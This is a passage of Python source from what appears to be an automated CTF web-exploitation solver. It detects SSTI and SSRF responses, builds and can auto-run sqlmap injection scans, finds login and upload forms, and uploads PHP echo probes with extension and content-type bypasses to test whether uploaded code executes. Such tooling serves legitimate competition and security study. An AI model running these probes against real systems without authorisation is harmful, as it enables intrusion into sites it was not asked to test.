            memory.add_exploit_plan("模板注入验证", "GET", base_url, data={param: payload}, notes="49 appeared in response", confidence=0.78)
            return "ssti"
        if payload.startswith("http") and comparison["score"] >= 0.35:
            memory.add_finding("probe", "疑似 SSRF / 回调参数差异", "param={0}, payload={1}".format(param, payload), 0.68)
            memory.add_exploit_plan("带外回调验证", "GET", base_url, data={param: payload}, notes="callback url caused meaningful difference", confidence=0.7)
            return "ssrf-probe"
        if comparison["elapsed_delta"] > 2.2:
            memory.add_finding("probe", "响应延迟显著升高", "param={0}, payload={1}".format(param, payload), 0.58)
            return "timing-shift"
        return ""

    def _maybe_add_sqlmap_plan(self, challenge, workspace, param, target_url, memory, context, mode):
        if not self.toolkit_tool:
            return
        extra_args = ["-p", param, "--level", "2", "--risk", "1", "--smart", "--random-agent"]
        if mode == "time":
            extra_args.extend(["--technique", "T"])
        elif mode == "error":
            extra_args.extend(["--technique", "E"])
        sqlmap_command = self.toolkit_tool.build_sqlmap_command(target_url, method="GET", extra_args=extra_args)
        if not sqlmap_command:
            return
        notes = "Suggested command: {0}".format(self.toolkit_tool.command_preview(sqlmap_command))
        if self.auto_run_sqlmap:
            result = self.shell_tool.run(sqlmap_command, timeout=240)
            if self._maybe_pause_on_approval(
                challenge,
                workspace,
                memory,
                checkpoint="sqlmap:{0}:{1}".format(mode, param),
                result=result,
                context=self._solver_context_snapshot(context, param=param, target_url=target_url, mode=mode),
                pending_action={"kind": "shell_sqlmap", "param": param, "mode": mode, "target_url": target_url},
                blocked_reason=str(result.get("message", "") or "sqlmap approval required"),
            ):
                return
            notes = "{0}\\nreturncode={1}".format(notes, result.get("returncode"))
        memory.add_exploit_plan("sqlmap 深挖 {0}".format(mode), "GET", target_url, data={"param": param}, notes=notes, confidence=0.74)

    def _extract_paths_from_text(self, text):
        results = set()
        for line in (text or "").splitlines():
            line = line.strip()
            if not line:
                continue
            if line.startswith("Allow:") or line.startswith("Disallow:"):
                value = line.split(":", 1)[1].strip()
                if value.startswith("/"):
                    results.add(value)
            if "<loc>" in line and "</loc>" in line:
                value = line.split("<loc>", 1)[1].split("</loc>", 1)[0].strip()
                parsed = urlparse(value)
                if parsed.path:
                    results.add(parsed.path)
        for item in self.PATH_PATTERN.findall(text or ""):
            if len(item) < 180:
                results.add(item)
        return results

    def _extract_query_keys(self, url):
        parsed = urlparse(url)
        return sorted({key for key, _ in parse_qsl(parsed.query, keep_blank_values=True)})

    def _infer_frameworks(self, body, headers):
        detections = []
        lowered = (body or "").lower()
        x_powered_by = headers.get("X-Powered-By", "").lower()
        server = headers.get("Server", "").lower()
        if "express" in x_powered_by or "express" in lowered:
            detections.append("Express / Node.js")
        if "php" in x_powered_by or ".php" in lowered:
            detections.append("PHP")
        if "__next_data__" in lowered:
            detections.append("Next.js")
        if "webpackjson" in lowered or "vue" in lowered:
            detections.append("Vue / Webpack")
        if "django" in lowered or "csrftoken" in lowered:
            detections.append("Django")
        if "flask" in lowered or "werkzeug" in server:
            detections.append("Flask / Werkzeug")
        if "laravel" in lowered:
            detections.append("Laravel")
        return sorted(set(detections))

    def _process_response_flags(self, text, source, memory, reproducible):
        for flag in self.verifier.discover_from_text(text):
            memory.add_candidate_flag(flag, source, 0.95 if reproducible else 0.7, reproducible=reproducible)

    def _save_http_artifact(self, workspace, name, response):
        suffix = ".txt"
        if "html" in response["content_type"]:
            suffix = ".html"
        elif "javascript" in response["content_type"] or name.startswith("script_"):
            suffix = ".js"
        elif "json" in response["content_type"]:
            suffix = ".json"
        artifact = workspace / "artifacts" / "{0}{1}".format(name, suffix)
        payload = {
            "url": response["url"],
            "status": response["status"],
            "headers": response["headers"],
            "cookies": response.get("cookies", []),
            "elapsed": response.get("elapsed"),
            "body": response["text"][:250000],
        }
        if suffix == ".json":
            self.file_tool.write_json(artifact, payload)
        else:
            self.file_tool.write_text(artifact, json.dumps(payload, ensure_ascii=False, indent=2))
        return str(artifact)

    def _status_text(self, response):
        if response.get("error"):
            return "error"
        return str(response.get("status"))

    def _safe_name(self, value):
        return re.sub(r"[^a-zA-Z0-9._-]+", "_", value or "item").strip("_") or "item"

    def _extract_login_fields(self, form):
        username = None
        password = None
        hidden = {}
        for item in form.get("inputs", []):
            name = (item.get("name") or "").strip()
            field_type = (item.get("type") or "text").lower()
            if not name:
                continue
            lowered = name.lower()
            if field_type == "hidden":
                hidden[name] = item.get("value", "")
            if field_type == "password" or lowered in self.PASSWORD_KEYS:
                password = name
            if lowered in self.USERNAME_KEYS or (field_type in ("text", "email") and not username):
                username = name
        return {"username": username, "password": password, "hidden": hidden}

    def _looks_like_login_form(self, form):
        fields = self._extract_login_fields(form)
        return bool(fields["username"] and fields["password"])

    def _looks_like_upload_form(self, form):
        action = (form.get("action") or "").lower()
        enctype = (form.get("enctype") or "").lower()
        if "multipart/form-data" in enctype:
            return True
        for item in form.get("inputs", []):
            if (item.get("type") or "").lower() == "file":
                return True
            name = (item.get("name") or "").lower()
            if any(keyword in name for keyword in self.UPLOAD_HINTS):
                return True
        return any(keyword in action for keyword in self.UPLOAD_HINTS)

    def _build_upload_probes(self):
        token = "CTFUPLOAD_{0}".format(uuid.uuid4().hex[:10])
        php_body = "<?php echo '{0}'; ?>".format(token)
        return [
            {"kind": "text", "filename": "probe_{0}.txt".format(token.lower()), "content": token, "content_type": "text/plain", "token": token},
            {"kind": "php", "filename": "probe_{0}.php".format(token.lower()), "content": php_body, "content_type": "application/x-httpd-php", "token": token},
            {"kind": "php", "filename": "probe_{0}.phtml".format(token.lower()), "content": php_body, "content_type": "application/octet-stream", "token": token},
            {"kind": "php", "filename": "probe_{0}.php5".format(token.lower()), "content": php_body, "content_type": "application/octet-stream", "token": token},
            {"kind": "php", "filename": "probe_{0}.php.jpg".format(token.lower()), "content": php_body, "content_type": "image/jpeg", "token": token},
            {"kind": "php", "filename": "probe_{0}.pht".format(token.lower()), "content": php_body, "content_type": "application/octet-stream", "token": token},
            {"kind": "php", "filename": "probe_{0}.phar".format(token.lower()), "content": php_body, "content_type": "application/octet-stream", "token": token},
            {"kind": "php", "filename": "probe_{0}.php.png".format(token.lower()), "content": php_body, "content_type": "image/png", "token": token},
        ]

    def _classify_uploaded_probe(self, response, probe):
        text = (response.get("text") or "").strip()
        token = str(probe.get("token") or "")
        if not token or token not in text:
            return ""
        if probe.get("kind") == "php":
            normalized = text.replace("\r", "").strip()
            if normalized == token or (token in normalized and "<?php" not in normalized.lower()):
                return "executable"
        return "readable"

    def _extract_upload_urls(self, base_url, response, filename):
        urls = set()
        headers = response.get("headers", {})
        if headers.get("Location"):
            urls.add(urljoin(base_url, headers["Location"]))
        text = response.get("text", "")
        for absolute in self.URL_PATTERN.findall(text):
            if filename.lower() in absolute.lower():
                urls.add(absolute)
        for path in self.PATH_PATTERN.findall(text):
            if filename.lower() in path.lower():
                urls.add(urljoin(base_url, path))
        for template in self.UPLOAD_PATH_CANDIDATES:
            urls.add(urljoin(base_url, template.format(filename=filename)))
        return sorted(urls)

    def _login_success_score(self, baseline, response, comparison):
        score = 0
        baseline_text = (baseline.get("text") or "").lower()
        response_text = (response.get("text") or "").lower()
        if any(item in response_text for item in self.SUCCESS_HINTS):
            score += 2
        if any(item in response_text for item in self.FAILURE_HINTS):
            score -= 2
        if response.get("url") != baseline.get("url"):
            score += 1
        if response.get("cookies") and response.get("cookies") != baseline.get("cookies"):
            score += 1
        if "login" in baseline_text and "login" not in response_text:
            score += 1
        if comparison["score"] >= 0.45:
            score += 1
        return score

    def _derive_hypotheses(self, summary, frameworks, discovered_paths):
        hypotheses = []
        if summary.get("forms"):
            hypotheses.append("优先检查表单、登录链路和隐藏字段，确认是否存在弱口令、鉴权绕过或逻辑缺陷。")
        if any("upload" in path.lower() for path in discovered_paths):
            hypotheses.append("发现 upload 相关路径，继续验证文件上传限制、落地路径和脚本执行能力。")
        if any("admin" in path.lower() for path in discovered_paths):
            hypotheses.append("发现 admin 相关路径，继续验证未授权访问、权限错配和默认口令。")
        if any("api" in path.lower() for path in discovered_paths):
            hypotheses.append("继续枚举 API 路由，对关键参数做差分探测和 SQLi / SSRF / LFI 尝试。")
        if frameworks:
            hypotheses.append("结合框架指纹优先检查默认行为、调试入口和常见误配置。")
        if not hypotheses:
            hypotheses.append("继续扩大 JS 路由、参数与上传点枚举范围，再做响应差分分析。")
        return hypotheses

    def _prioritize_paths(self, paths):
        def path_score(path):
            lowered = (path or "").lower()
            score = 0
            for keyword in ["admin", "api", "login", "graphql", "debug", "upload", "file", "import"]:
                if keyword in lowered:
                    score += 2
            if path == "/":
                score += 1
            return (-score, len(path), path)

        return sorted({item for item in paths if item}, key=path_score)

    def _prioritize_params(self, params):
        def param_score(name):
            lowered = (name or "").lower()
            score = 0
            if lowered in self.SSRF_PARAM_NAMES:
                score += 3
            for keyword in ["id", "file", "path", "debug", "token", "search", "page", "url", "redirect"]:
                if keyword in lowered:
                    score += 2
            return (-score, len(name), name)

        return sorted({item for item in params if item}, key=param_score)

    def _choose_best_plan(self, state, executed_plan_keys):
        remaining = [item for item in state.exploit_plans if self._plan_key(item) not in executed_plan_keys]
        if not remaining:
            return None
        return sorted(remaining, key=self._plan_score, reverse=True)[0]

    def _plan_score(self, item):
        score = float(item.confidence)
        title = (item.title or "").lower()
        notes = (item.notes or "").lower()
        if "upload" in title or "上传" in item.title:
            score += 0.12
        if "browser" in title:
            score += 0.07
        if "sql" in title:
            score += 0.06
        if "oob" in title or "回连" in item.title:
            score += 0.08
        if "login" in title or "登录" in item.title:
            score += 0.05
        if "authenticated" in notes or "browser-authenticated" in notes:
            score += 0.1
        if "flag" in notes:
            score += 0.06
        if "uploaded_probe_url" in json.dumps(item.data, ensure_ascii=False):
            score += 0.08
        if "executed" in notes:
            score += 0.05
        return score

    def _plan_key(self, item):
        return "{0}|{1}|{2}|{3}".format(item.title, item.method, item.url, json.dumps(item.data, ensure_ascii=False, sort_keys=True))

    def _looks_numeric_param(self, name):
        return (name or "").lower() in {"id", "uid", "pid", "page", "index", "number"}
